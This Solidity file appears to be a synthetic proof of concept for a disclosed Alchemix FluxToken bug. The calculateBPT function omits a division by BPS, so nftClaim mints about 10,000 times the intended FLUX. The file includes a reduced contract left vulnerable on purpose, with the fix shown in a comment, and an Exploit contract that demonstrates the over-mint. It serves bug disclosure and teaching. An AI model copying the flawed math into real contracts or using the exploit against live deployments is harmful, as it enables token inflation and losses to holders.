// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — `FluxToken.calculateBPT` uses wrong algorithm causing
    `FluxToken.nftClaim` revenue to be 10,000x higher than expected
    (Immunefi, yttriumzz, finding #38191)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground. `calculateBPT`
    is inlined VERBATIM from FluxToken.sol#L232-L234 (audited commit
    f1007439ad3a32e412468c4c42f62f676822dc1f) — missing the `/ BPS` division
    that the `bptMultiplier` comment ("the ratio ... receive (.4%)") requires.
    The Exploit deploys a reduced FluxToken + veALCX + patron NFT, claims FLUX
    for one NFT via `nftClaim`, and shows the minted amount is ~10,000x the
    amount the documented 0.4% ratio should produce (no fork, no cheatcodes).

    Root cause: `bptMultiplier = 40` is meant to represent 40 bps (0.4%), so
    every consumer of it must divide by `BPS` (10_000) to get the fraction.
    `calculateBPT` multiplies by `bptMultiplier` and returns the raw product
    without ever dividing by `BPS` — so `bpt` (and therefore every downstream
    FLUX amount derived from it in `getClaimableFlux`) is exactly `BPS` (10,000)
    times too large.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced veALCX: only the 4 constants `getClaimableFlux` reads.
///         Real values from VotingEscrow.sol (MULTIPLIER=2, MAXTIME=365 days,
///         fluxPerVeALCX=5000 bps, fluxMultiplier=4).
contract MockVeALCX {
    uint256 public constant MULTIPLIER = 2;
    uint256 public constant MAXTIME = 365 days;
    uint256 public fluxPerVeALCX = 5000;
    uint256 public fluxMultiplier = 4;
}

interface IMockVeALCX {
    function MULTIPLIER() external view returns (uint256);
    function MAXTIME() external view returns (uint256);
    function fluxPerVeALCX() external view returns (uint256);
    function fluxMultiplier() external view returns (uint256);
}

/// @notice Reduced patron NFT: only `ownerOf` + `tokenData`, exactly what
///         `FluxToken.nftClaim` reads from `IAlEthNFT`.
contract PatronNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public tokenData;

    function mint(address to, uint256 tokenId, uint256 data) external {
        ownerOf[tokenId] = to;
        tokenData[tokenId] = data;
    }
}

/// @notice Reduced FluxToken: `calculateBPT` and `getClaimableFlux` are
///         verbatim from the audited contract; `nftClaim` is trimmed to the
///         single-NFT-type path (the real contract also supports an
///         alchemechNFT branch, irrelevant to this bug) and mints into a
///         plain balance map instead of full ERC20 (the bug lives entirely
///         in the math, not in the ERC20 mechanics).
contract FluxToken {
    address public veALCX;
    address public patronNFT;

    uint256 internal constant BPS = 10_000;
    /// @notice The ratio of FLUX patron NFT holders receive (.4%) — verbatim comment from FluxToken.sol#L43.
    uint256 public bptMultiplier = 40;

    mapping(uint256 => bool) public claimed;
    mapping(address => uint256) public balanceOf;

    constructor(address _veALCX, address _patronNFT) {
        veALCX = _veALCX;
        patronNFT = _patronNFT;
    }

    // @> VULN: missing `/ BPS` — bptMultiplier represents 0.4% (40 out of
    // 10_000 bps) but is never divided by BPS, so bptOut is 10_000x too large.
    function calculateBPT(uint256 _amount) public view returns (uint256 bptOut) {
        bptOut = _amount * bptMultiplier;
    }
    // FIX: bptOut = (_amount * bptMultiplier) / BPS;

    // Verbatim from FluxToken.sol#L215-L230 (patronNFT branch only).
    function getClaimableFlux(uint256 _amount) public view returns (uint256 claimableFlux) {
        uint256 bpt = calculateBPT(_amount);

        uint256 veMul = IMockVeALCX(veALCX).MULTIPLIER();
        uint256 veMax = IMockVeALCX(veALCX).MAXTIME();
        uint256 fluxPerVe = IMockVeALCX(veALCX).fluxPerVeALCX();
        uint256 fluxMul = IMockVeALCX(veALCX).fluxMultiplier();

        // Amount of flux earned in 1 yr from _amount assuming it was deposited for maxtime
        claimableFlux = (((bpt * veMul) / veMax) * veMax * (fluxPerVe + BPS)) / BPS / fluxMul;
    }

    function nftClaim(uint256 _tokenId) external {
        require(!claimed[_tokenId], "already claimed");
        require(PatronNFT(patronNFT).ownerOf(_tokenId) == msg.sender, "not owner of Patron NFT");

        claimed[_tokenId] = true;

        uint256 tokenData = PatronNFT(patronNFT).tokenData(_tokenId);
        uint256 amount = getClaimableFlux(tokenData);

        balanceOf[msg.sender] += amount;
    }
}

/// @notice Deploys the reduced system, claims FLUX for one patron NFT, and
///         proves the minted amount is ~10,000x the amount the documented
///         0.4% (bptMultiplier / BPS) ratio should have produced.
contract Exploit {
    MockVeALCX public ve;
    PatronNFT public nft;
    FluxToken public flux;

    uint256 public constant TOKEN_ID = 1;
    // Same order of magnitude as the original PoC's patron NFT (~0.25 ether-scale tokenData).
    uint256 public constant TOKEN_DATA = 250_000_000_000_000_000;

    // Reference values matching MockVeALCX's constants, used ONLY to compute
    // the "should have been" amount for comparison — not part of the bug.
    uint256 internal constant BPS = 10_000;
    uint256 internal constant VE_MUL = 2;
    uint256 internal constant VE_MAX = 365 days;
    uint256 internal constant FLUX_PER_VE = 5000;
    uint256 internal constant FLUX_MUL = 4;
    uint256 internal constant BPT_MULTIPLIER = 40;

    constructor() {
        ve = new MockVeALCX();
        nft = new PatronNFT();
        flux = new FluxToken(address(ve), address(nft));

        nft.mint(address(this), TOKEN_ID, TOKEN_DATA);
    }

    function run() external {
        flux.nftClaim(TOKEN_ID);
        uint256 actualFlux = flux.balanceOf(address(this));

        // The amount the documented 0.4% ratio (bptMultiplier / BPS) should
        // have produced, using the exact same downstream formula.
        uint256 correctBpt = (TOKEN_DATA * BPT_MULTIPLIER) / BPS;
        uint256 expectedFlux = (((correctBpt * VE_MUL) / VE_MAX) * VE_MAX * (FLUX_PER_VE + BPS)) / BPS / FLUX_MUL;

        // HARM: the claimed FLUX is ~10,000x the amount the documented 0.4%
        // ratio should have produced — a single patron NFT mints thousands of
        // times its entitled FLUX, inflating supply and diluting every other
        // FLUX holder / draining the value the treasury intended to allocate.
        require(actualFlux > expectedFlux * 9000, "harm not demonstrated: inflation should be ~10000x");
        require(actualFlux < expectedFlux * 11000, "sanity: inflation should be close to 10000x, not more");
    }
}
